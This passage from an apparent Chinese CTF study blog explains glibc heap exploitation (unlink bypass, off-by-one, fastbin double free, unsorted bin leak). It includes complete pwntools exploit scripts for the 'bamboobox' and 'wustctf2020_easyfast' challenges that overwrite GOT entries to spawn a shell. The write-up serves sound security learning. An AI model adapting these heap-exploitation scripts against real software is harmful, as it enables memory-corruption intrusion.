BK-&gt;fd = FD;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))			      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      </span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      </span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">	      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      </span><br><span class="line">                <span class="keyword">else</span> &#123;							      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      </span><br><span class="line">                  &#125;							      </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;							      </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      </span><br><span class="line">              &#125;								      </span><br><span class="line">          &#125;								      </span><br><span class="line">      &#125;									      </span><br><span class="line">&#125;						</span><br></pre></td></tr></table></figure>

<p>主要的检查代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);	</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      </span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);	</span><br><span class="line"></span><br><span class="line"><span class="comment">// largebin 中 next_size 双向链表完整性检查(???)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              </span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">    malloc_printerr (check_action,<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,P, AV);</span><br></pre></td></tr></table></figure>

<h4 id="伪造过程（以64位为例）"><a href="#伪造过程（以64位为例）" class="headerlink" title="伪造过程（以64位为例）"></a>伪造过程（以64位为例）</h4><ol>
<li><p>获取将要合并到的堆地址，P 一般存在于 bss 段的堆管理列表中，相当于 *chunk &#x3D; P。</p>
<p>假设 chunk &#x3D; 0x602280</p>
</li>
<li><p>通过溢出等手段改写 chunk 的 fd 与 bk 指针的值，令：</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P_fd = chunk - <span class="number">0x18</span> = <span class="number">0x602268</span></span><br><span class="line">P_bk = chunk - <span class="number">0x10</span> = <span class="number">0x602270</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>绕过</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为临时变量赋值</span></span><br><span class="line">FD = P-&gt;fd;		<span class="comment">// FD = 0x602268</span></span><br><span class="line">BK = P-&gt;bk;		<span class="comment">// BK = 0x602270</span></span><br><span class="line"><span class="comment">//脱链</span></span><br><span class="line">FD-&gt;bk = BK;	<span class="comment">// *(0x602268 + 0x18) = *(0x602280) = 0x602270</span></span><br><span class="line">BK-&gt;fd = FD;    <span class="comment">// *(0x602270 + 0x10) = *(0x602280) = 0x602268</span></span><br></pre></td></tr></table></figure>

<p>相当于往 0x602280（chunk）地址对应的内存中写入了 0x602268（即 chunk - 0x18）的值。</p>
<p>再查看检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查 fd 和 bk 指针，确实都指向 P</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      </span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="例题：hitcontraining-unlink"><a href="#例题：hitcontraining-unlink" class="headerlink" title="例题：hitcontraining_unlink"></a>例题：hitcontraining_unlink</h4><p>64 位，开启了 NX 和 cananry。</p>
<p>用 IDA 查看发现是标准的菜单题。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bamboobox Menu&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.show the items in the box&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.add a new item&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.change the item in the box&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.remove the item in the box&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice:&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还给了 一个可以直接读出 flag 的 magic 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">magic</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">&quot;/home/bamboobox/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看函数的大致情况。add：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unlink_add.png" class="">

<p>没有开 PIE ，且change函数处存在溢出漏洞，满足 unlink 的条件，推测是通过 unlink 修改 got 表。</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unlink_change.png" class="">

<p>show 处则可以 泄露 libc。</p>
<h5 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h5><ol>
<li><p>创建堆块</p>
</li>
<li><p>构造 fake_chunk ，利用溢出篡改 chunk 1 的 prev_size 标志位为 0</p>
</li>
<li><p>free chunk 1，触发 unlink，使得 堆块 0 和 1 合并</p>
</li>
<li><p>把 chunk 移到存储 chunk 指针的内存处</p>
</li>
<li><p>覆盖 chunk 0 指针为 atoi 的 got 表地址并泄露</p>
</li>
<li><p>覆盖 atoi 的 got 表为 system 函数地址。</p>
</li>
<li><p>输入 &#x2F;bin&#x2F;sh getshell</p>
</li>
</ol>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/nemuzuki/p/17293352.html">buuctf pwn hitcontraining_unlink unlink堆溢出利用 - Nemuzuki - 博客园 (cnblogs.com)</a></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,29352)</span></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>, os = <span class="string">&quot;linux&quot;</span>, log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;bamboobox&quot;</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">backdoor = <span class="number">0x400D49</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gdb.attach(p)</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># create chunk</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;cccc&#x27;</span>)  <span class="comment">#避免合并到top chunk而申请的other_chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create fake chunk and overflow</span></span><br><span class="line">ptr = <span class="number">0x6020C8</span></span><br><span class="line">fake_fd = ptr - <span class="number">0x18</span></span><br><span class="line">fake_bk = ptr - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) <span class="comment"># prev_size and present_size</span></span><br><span class="line">payload1 += p64(fake_fd) + p64(fake_bk)</span><br><span class="line">payload1 += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload1 += p64(<span class="number">0x40</span>) + p64(<span class="number">0x90</span>) <span class="comment"># chunk 1&#x27;s prev_size and size</span></span><br><span class="line"><span class="comment"># this is important,we use overflow to change PREV_INUSE from 1 to 0</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x60</span>,payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change ptr = atoi_got</span></span><br><span class="line">payload2 = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">payload2 += p64(atoi_got)</span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x60</span>,payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># show and leak the libc</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0 : &#x27;</span>)</span><br><span class="line">atoi = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>,atoi)</span><br><span class="line">libc_base = atoi - libc.dump(<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">success(<span class="string">&#x27;atoi = &#x27;</span> + <span class="built_in">hex</span>(atoi))</span><br><span class="line">success(<span class="string">&#x27;libc_base = &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&#x27;sys_addr = &#x27;</span> + <span class="built_in">hex</span>(sys_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># change atoi_got to sys_addr </span></span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x8</span>,p64(sys_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># chage atoi_got to backdoor</span></span><br><span class="line"><span class="comment"># change(0,0x8,p64(backdoor))</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="off-by-xxx"><a href="#off-by-xxx" class="headerlink" title="off by xxx"></a>off by xxx</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/208407">Off by Null的前世今生-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>off by one：非预期地溢出一个字节</p>
<p>off by null：非预期地溢出 ‘\x00’</p>
<p>一般利用 off by 溢出进行堆叠和布局。</p>
<h3 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h3><p>fastbins 的特点：</p>
<ol>
<li>fast bin chunk 的 prev_IN_USE 标志位永远为 1。</li>
<li>通过 fd 连接的单向链表</li>
<li>LIFO</li>
<li>管理 0x20,0x30,0x40,0x50,0x60,0x70,0x80 大小的 free chunk，可以通过修改 global_max_fast 来更改最大范围</li>
</ol>
<p>方法分类：</p>
<p>fast bin double free</p>
<p>house of spirit（在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的）</p>
<p>alloc to stack（劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据）</p>
<p>arbitrary alloc（Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等）</p>
<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>fastbin 通过单链表连接，修改其 fd 即可控制下一个申请的地址。条件：size 位与 fastbin 管理的大小对应。</p>
<h4 id="fast-bin-double-free"><a href="#fast-bin-double-free" class="headerlink" title="fast bin double free"></a>fast bin double free</h4><p>以一段 c 代码为例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> data[<span class="number">2023</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="type">void</span> *chunk1,*chunk2;</span><br><span class="line">	chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1);</span><br><span class="line">	<span class="built_in">free</span>(chunk2);</span><br><span class="line">	<span class="built_in">free</span>(chunk1);</span><br><span class="line">	<span class="type">void</span> *chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)chunk3 = data;</span><br><span class="line">	data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	data[<span class="number">1</span>] = <span class="number">0x21</span>;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="type">void</span> *target = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p  %p\n&quot;</span>,data,target);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行得到：</span></span><br><span class="line">giantbranch@ubuntu:~/Desktop/test$ ./a.out</span><br><span class="line"><span class="number">0x601080</span>  <span class="number">0x601090</span></span><br></pre></td></tr></table></figure>

<p>target 指向的就是用户使用的内存区域，data 对应 fake_chunk 的 header。</p>
<p>如图所示：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/double_free.PNG" class="">

<p>大致就是通过构造循环链表将堆块申请到我们想要的位置。</p>
<h5 id="例题：wustctf2020-easyfast"><a href="#例题：wustctf2020-easyfast" class="headerlink" title="例题：wustctf2020_easyfast"></a>例题：wustctf2020_easyfast</h5><p>一道64位的堆菜单题，首先还是逆向整理和函数编写。</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/easyfast_1.png" class="">

<p>要使得选择 4 可以执行 system，需要将 key 从 1 改为 0。</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/easyfmt_2.png" class="">

<p>查看 target 地址附近，在 size 位正好存在 0x50 帮助我们通过 size 验证。那我们申请的堆块大小为 0x40 即可</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/easyfast_3.png" class="">

<p>write可更改的数据要从 0x602090 开始，那我们将上一个 chunk 的 fd 改为 0x602080 即可。</p>
<p>需要注意的是，本题对可申请的堆块数量有一定限制，因此还要利用 UAF。</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p = process(&quot;./wustctf2020_easyfast&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27659</span>)</span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>, os = <span class="string">&quot;linux&quot;</span>, log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice&gt;&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;size&gt;&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice&gt;&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;index&gt;&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">index,payload</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice&gt;&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;3&#x27;</span>)	</span><br><span class="line">	p.recvuntil(<span class="string">&quot;index&gt;&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice&gt;&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602080</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x40</span>)  <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于 delete 函数中 free 后没有将指针置零，因此这里可以直接对 chunk0 进行改写（UAF）</span></span><br><span class="line">write(<span class="number">0</span>,p64(target))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x40</span>)  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">write(<span class="number">3</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">backdoor()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>原理如图所示：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/easyfast_4.PNG" class="">

<h3 id="Unsorted-bin-leak"><a href="#Unsorted-bin-leak" class="headerlink" title="Unsorted bin leak"></a>Unsorted bin leak</h3><p>small bin 大小的堆块被释放后会进入 unsorted bin。而 unsorted bin 中只有一个 chunk 时，该 chunk 的 fd 和 bk 指针指向 main_arena + 88。（如有多个则 fd 与 bk 有一个会指向 main_arena + 88）main_arena 作为一个全局变量存在于 libc.so 数据段。因此如果可以泄露该 chunk 的指针，就相当于泄露了 libc。</p>
<p>而且 main_arena 和 <code>__malloc_hook</code> 的偏移是固定的。可以通过偏移计算出 <code>__malloc_hook</code> 函数的地址，以此确定 libc。</p>
<h3 id="Unsorted-bin-attack"><a href="#Unsorted-bin-attack" class="headerlink" title="Unsorted bin attack"></a>Unsorted bin attack</h3><p>前提：控制 Unsorted Bin Chunk 的 bk 指针</p>
<p>目的：修改任意地址值为一个较大的数值</p>
<p>（通常是为了配合fastbin attack而使用的）盲猜是为 fastbin attack 绕过 size 位检查</p>
<p>当一个 free chunk 从 unsorted bin 中取出的时候，会执行如下代码：</p>
